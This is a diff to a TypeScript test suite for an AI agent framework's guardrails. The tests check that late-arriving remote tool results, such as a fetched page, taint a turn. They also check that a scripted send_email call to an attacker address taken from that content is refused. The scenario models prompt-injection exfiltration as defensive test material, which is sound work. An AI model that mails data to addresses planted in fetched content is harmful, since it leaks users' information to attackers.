@@ -13,6 +13,7 @@ import { registerProfile, registerTool, resetTools } from '../../src/kernel/defa
 import { assertEquals } from '../../src/kernel/engine/assert.ts';
 import { defineProfile } from '../../src/kernel/registry/profiles.ts';
 import type { ToolOperationOutcome } from '../../src/kernel/tools/operation.ts';
+import type { ToolCallRequest } from '../../src/kernel/turn-events.ts';
 import type {
   ModelRequest,
   TurnEvent,
@@ -22,6 +23,7 @@ import type {
   TurnRequest,
 } from '../../src/kernel/types.ts';
 import { failureOf, lastTool } from '../fixtures/events.ts';
+import { atOpen } from '../fixtures/late-results.ts';
 import { geminiModels } from '../fixtures/models.ts';
 
 const ATTACKER = 'attacker@example.com';
@@ -54,6 +56,16 @@ function registerTools(): void {
     input: z.object({}),
     output: z.object({ finding: z.string() }),
     handler: () => ({ finding: ATTACKER }),
+  });
+  registerTool({
+    ...local,
+    name: 'check_calendar',
+    description: 'Check the calendar',
+    access: 'read-only',
+    paths: ['*'],
+    input: z.object({}),
+    output: z.object({ finding: z.string() }),
+    handler: () => ({ finding: 'free all week' }),
   });
   registerTool({
     ...local,
@@ -97,7 +109,7 @@ async function runEvents(
       identity: { handle: 'deputy' },
       ...geminiModels('gemini35FlashLite'),
       maxSteps: 4,
-      tools: { allow: ['web_fetch', 'lookup_contact', 'send_email'] },
+      tools: { allow: ['web_fetch', 'lookup_contact', 'check_calendar', 'send_email'] },
       inputs: { text: true, context: { from: ['server'], maxChars: 2000 } },
       outputs: {},
       guardrails: {
@@ -221,10 +233,14 @@ Deno.test('a late remote result is a read, not the host or the user speaking', a
   registerTools();
   const finding = PAGE;
   const late = lateResult({ finding, modelText: FENCED_PAGE, provenance: REMOTE });
-  const input = { text: 'what did it find?', lateResults: [late] };
-  assertEquals(await sendResult('late_taint', 'afterRemoteRead', input), 'tainted_turn');
+  const input = { text: 'what did it find?' };
+  const opened = { lateResults: atOpen([late]) };
   assertEquals(
-    await sendResult('late_destination', 'remoteDestination', input),
+    await sendResult('late_taint', 'afterRemoteRead', input, sendsOnce(), opened),
+    'tainted_turn',
+  );
+  assertEquals(
+    await sendResult('late_destination', 'remoteDestination', input, sendsOnce(), opened),
     'remote_destination',
   );
 });
@@ -233,12 +249,9 @@ Deno.test('the model reads a late result in its fence, after the message', async
   registerTools();
   const requests: ModelRequest[] = [];
   const late = lateResult({ finding: PAGE, modelText: FENCED_PAGE, provenance: REMOTE });
-  await sendResult(
-    'late_read',
-    'remoteDestination',
-    { text: 'go on', lateResults: [late] },
-    sendsOnce(requests),
-  );
+  await sendResult('late_read', 'remoteDestination', { text: 'go on' }, sendsOnce(requests), {
+    lateResults: atOpen([late]),
+  });
   const opening = (requests[0]?.history ?? []).map((message) => message.content ?? '');
   assertEquals(opening[0]?.includes('go on'), true);
   assertEquals(opening[1]?.includes(FENCED_PAGE), true);
@@ -246,8 +259,14 @@ Deno.test('the model reads a late result in its fence, after the message', async
 });
 
 /** The reply's events, and the history a host builds from them. */
-async function builtFromEvents(id: string, input: TurnInput) {
-  const events = await runEvents(id, 'remoteDestination', input);
+async function builtFromEvents(
+  id: string,
+  input: TurnInput,
+  late: readonly ToolOperationOutcome[] = [],
+) {
+  const events = await runEvents(id, 'remoteDestination', input, sendsOnce(), {
+    lateResults: atOpen(late),
+  });
   const base: TurnHistoryMessage[] = input.text ? [{ role: 'user', content: input.text }] : [];
   return {
     events,
@@ -258,10 +277,12 @@ async function builtFromEvents(id: string, input: TurnInput) {
 Deno.test('a history built from events holds a late result as the run read it', async () => {
   registerTools();
   const late = lateResult({ finding: PAGE, modelText: FENCED_PAGE, provenance: REMOTE });
-  const input = { text: 'a', lateResults: [late] };
-  const { events, history } = await builtFromEvents('late_event', input);
+  const input = { text: 'a' };
+  const { events, history } = await builtFromEvents('late_event', input, [late]);
   const requests: ModelRequest[] = [];
-  await sendResult('late_event_r', 'remoteDestination', input, sendsOnce(requests));
+  await sendResult('late_event_r', 'remoteDestination', input, sendsOnce(requests), {
+    lateResults: atOpen([late]),
+  });
   const read = requests[0]?.history?.[1];
   assertEquals(history[1], read);
   const rebuilt = historyFromTranscriptBlocks(foldConversationTurn({ text: 'a' }, events));
@@ -283,12 +304,8 @@ Deno.test('a refusal gives nothing, so a pause does not free the address it name
 Deno.test('a late result passed on each run stays one message', async () => {
   registerTools();
   const late = lateResult({ finding: PAGE, modelText: FENCED_PAGE, provenance: REMOTE });
-  const input = { text: 'a', lateResults: [late] };
-  const first = await builtFromEvents('late_twice', input);
-  const again = await builtFromEvents('late_twice_2', {
-    history: first.history,
-    lateResults: [late],
-  });
+  const first = await builtFromEvents('late_twice', { text: 'a' }, [late]);
+  const again = await builtFromEvents('late_twice_2', { history: first.history }, [late]);
   assertEquals(
     again.events.some((event) => event.type === 'late_results'),
     false,
@@ -296,7 +313,9 @@ Deno.test('a late result passed on each run stays one message', async () => {
   assertEquals(again.history.filter(isLateResult).length, 1);
   const history = again.history;
   assertEquals(
-    await sendResult('late_twice_d', 'remoteDestination', { history, lateResults: [late] }),
+    await sendResult('late_twice_d', 'remoteDestination', { history }, sendsOnce(), {
+      lateResults: atOpen([late]),
+    }),
     'remote_destination',
   );
 });
@@ -308,8 +327,8 @@ Deno.test('a second late result joins the history beside the first', async () =>
     { finding: 'other', modelText: wrapToolData('other', REMOTE), provenance: REMOTE },
     'other-op',
   );
-  const { history } = await builtFromEvents('late_pair', { text: 'a', lateResults: [late] });
-  const next = await builtFromEvents('late_pair_2', { history, lateResults: [late, other] });
+  const { history } = await builtFromEvents('late_pair', { text: 'a' }, [late]);
+  const next = await builtFromEvents('late_pair_2', { history }, [late, other]);
   assertEquals(next.history.filter(isLateResult).length, 2);
 });
 
@@ -319,9 +338,16 @@ Deno.test('a late local result taints nothing, and its address is given', async 
     finding: ATTACKER,
     provenance: { origin: 'local', tool: 'research', depth: 1 },
   });
-  const input = { text: 'send it', lateResults: [late] };
-  assertEquals(await sendResult('late_local', 'afterRemoteRead', input), 'sent');
-  assertEquals(await sendResult('late_local_dest', 'remoteDestination', input), 'sent');
+  const input = { text: 'send it' };
+  const opened = { lateResults: atOpen([late]) };
+  assertEquals(
+    await sendResult('late_local', 'afterRemoteRead', input, sendsOnce(), opened),
+    'sent',
+  );
+  assertEquals(
+    await sendResult('late_local_dest', 'remoteDestination', input, sendsOnce(), opened),
+    'sent',
+  );
 });
 
 Deno.test('a fence reads wherever it stands in a message, and only a whole one', () => {
@@ -342,18 +368,24 @@ Deno.test('a fence reads wherever it stands in a message, and only a whole one',
 });
 
 /** The history a run left when the model ended it, with a held call after it. */
-async function pausedAfter(id: string, input: TurnInput): Promise<TurnHistoryMessage[]> {
+async function pausedAfter(
+  id: string,
+  input: TurnInput,
+  late: readonly ToolOperationOutcome[],
+): Promise<TurnHistoryMessage[]> {
   const requests: ModelRequest[] = [];
-  await sendResult(id, 'remoteDestination', input, sendsOnce(requests));
+  await sendResult(id, 'remoteDestination', input, sendsOnce(requests), {
+    lateResults: atOpen(late),
+  });
   return [
     ...(requests[0]?.history ?? []),
     {
       role: 'assistant',
       tool_calls: [
-        { id: 'held', type: 'function', function: { name: 'lookup_contact', arguments: '{}' } },
+        { id: 'held', type: 'function', function: { name: 'check_calendar', arguments: '{}' } },
       ],
     },
-    { role: 'tool', tool_call_id: 'held', name: 'lookup_contact', content: 'nobody' },
+    { role: 'tool', tool_call_id: 'held', name: 'check_calendar', content: 'free all week' },
   ];
 }
 
@@ -364,7 +396,7 @@ for (const [name, input] of [
   Deno.test(`a late result ${name} keeps its marks across a pause`, async () => {
     registerTools();
     const late = lateResult({ finding: PAGE, modelText: FENCED_PAGE, provenance: REMOTE });
-    const history = await pausedAfter(`late_pause_${name}`, { ...input, lateResults: [late] });
+    const history = await pausedAfter(`late_pause_${name}`, input, [late]);
     assertEquals(
       await sendResult(`late_pause_t_${name}`, 'afterRemoteRead', { history }),
       'tainted_turn',
@@ -379,7 +411,7 @@ for (const [name, input] of [
 Deno.test('a late result of an earlier reply does not mark a pause in this one', async () => {
   registerTools();
   const late = lateResult({ finding: PAGE, modelText: FENCED_PAGE, provenance: REMOTE });
-  const earlier = await pausedAfter('late_old', { text: 'first', lateResults: [late] });
+  const earlier = await pausedAfter('late_old', { text: 'first' }, [late]);
   const history: TurnHistoryMessage[] = [
     ...earlier,
     { role: 'assistant', content: 'done' },
@@ -393,12 +425,9 @@ Deno.test('an address in a late result of an earlier turn is not given', async (
   registerTools();
   const late = lateResult({ finding: PAGE, modelText: FENCED_PAGE, provenance: REMOTE });
   const requests: ModelRequest[] = [];
-  await sendResult(
-    'late_next_0',
-    'remoteDestination',
-    { text: 'a', lateResults: [late] },
-    sendsOnce(requests),
-  );
+  await sendResult('late_next_0', 'remoteDestination', { text: 'a' }, sendsOnce(requests), {
+    lateResults: atOpen([late]),
+  });
   const history: TurnHistoryMessage[] = [
     ...(requests[0]?.history ?? []),
     { role: 'assistant', content: 'done' },
@@ -503,4 +532,110 @@ Deno.test('a Continue goes on with the reply it continues', async () => {
   assertEquals(await sendResult('stopped', 'afterRemoteRead', request), 'sent');
   const continued = await continueResult(history);
   assertEquals(continued, 'tainted_turn');
+});
+
+/** A model that makes `calls` one per step, then ends; `requests` keeps what each step was sent. */
+function callsInTurn(calls: ToolCallRequest[], requests: ModelRequest[] = []): TurnModel {
+  return {
+    async *complete(request) {
+      requests.push(request);
+      const tool = calls.shift();
+      if (tool) yield { type: 'tool', tool };
+    },
+  };
+}
+
+const sendCall = { name: 'send_email', callId: 'send', arguments: { to: ATTACKER } };
+
+for (const gate of ['afterRemoteRead', 'remoteDestination'] as const) {
+  Deno.test(`a late remote result read mid-reply marks the rest of the reply (${gate})`, async () => {
+    registerTools();
+    const late = lateResult({ finding: PAGE, modelText: FENCED_PAGE, provenance: REMOTE });
+    const check = { name: 'check_calendar', callId: 'check', arguments: {} };
+    const model = callsInTurn([check, sendCall]);
+    const events = await runEvents(`late_mid_${gate}`, gate, { text: 'a' }, model, {
+      lateResults: ({ stage }) => (stage === 'post_tool' ? [late] : []),
+    });
+    assertEquals(
+      events.flatMap((event) => (event.type === 'late_results' ? [event.stage] : [])),
+      ['post_tool'],
+    );
+    const refused = gate === 'afterRemoteRead' ? 'tainted_turn' : 'remote_destination';
+    assertEquals(failureOf(lastTool(events, 'send_email'))?.code, refused);
+  });
+}
+
+Deno.test('a read before a late result that lands mid-reply keeps its marks across a pause', async () => {
+  registerTools();
+  const harmless = lateResult({
+    finding: 'nothing new',
+    provenance: { origin: 'local', tool: 'research', depth: 1 },
+  });
+  const requests: ModelRequest[] = [];
+  const fetchCall = {
+    name: 'web_fetch',
+    callId: 'f',
+    arguments: { url: 'https://api.example.com/page' },
+  };
+  const original = globalThis.fetch;
+  globalThis.fetch = (() => Promise.resolve(Response.json({ text: PAGE }))) as typeof fetch;
+  try {
+    await runEvents(
+      'late_mid_pause',
+      'afterRemoteRead',
+      { text: 'a' },
+      callsInTurn([fetchCall], requests),
+      {
+        lateResults: ({ stage }) => (stage === 'post_tool' ? [harmless] : []),
+      },
+    );
+  } finally {
+    globalThis.fetch = original;
+  }
+  const read = requests[1]?.history ?? [];
+  assertEquals(isLateResult(read.at(-1) ?? { role: 'user', content: '' }), true);
+  const history: TurnHistoryMessage[] = [
+    ...read,
+    {
+      role: 'assistant',
+      tool_calls: [
+        { id: 'held', type: 'function', function: { name: 'lookup_contact', arguments: '{}' } },
+      ],
+    },
+    { role: 'tool', tool_call_id: 'held', name: 'lookup_contact', content: 'nobody' },
+  ];
+  assertEquals(
+    await sendResult('late_mid_pause_t', 'afterRemoteRead', { history }),
+    'tainted_turn',
+  );
+});
+
+Deno.test('a late result that lands as a paused reply goes on keeps the reply’s marks', async () => {
+  registerTools();
+  const harmless = lateResult({
+    finding: 'nothing new',
+    provenance: { origin: 'local', tool: 'research', depth: 1 },
+  });
+  const requests: ModelRequest[] = [];
+  const check = { name: 'check_calendar', callId: 'check', arguments: {} };
+  await runEvents(
+    'late_resume',
+    'afterRemoteRead',
+    { history: replyRead(FENCED_PAGE) },
+    callsInTurn([check], requests),
+    { lateResults: atOpen([harmless]) },
+  );
+  const read = requests[0]?.history ?? [];
+  assertEquals(isLateResult(read.at(-1) ?? { role: 'user', content: '' }), true);
+  const history: TurnHistoryMessage[] = [
+    ...read,
+    {
+      role: 'assistant',
+      tool_calls: [
+        { id: 'held', type: 'function', function: { name: 'check_calendar', arguments: '{}' } },
+      ],
+    },
+    { role: 'tool', tool_call_id: 'held', name: 'check_calendar', content: 'free all week' },
+  ];
+  assertEquals(await sendResult('late_resume_t', 'afterRemoteRead', { history }), 'tainted_turn');
 });
